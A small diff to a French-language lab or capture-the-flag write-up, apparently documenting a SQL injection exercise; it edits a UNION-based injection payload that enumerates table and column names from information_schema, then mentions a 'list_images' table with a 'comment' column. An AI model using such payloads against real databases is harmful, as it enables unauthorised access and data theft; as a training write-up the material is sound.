@@ -7,7 +7,7 @@ En utilisant le meme injection que dans [sqli_page_member](../../sqli_page_membe
 On utilise cette query:
 
 ```sql
-ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 
 On peut voir qu'il y une tables `list_images` avec une colonne `comment`:
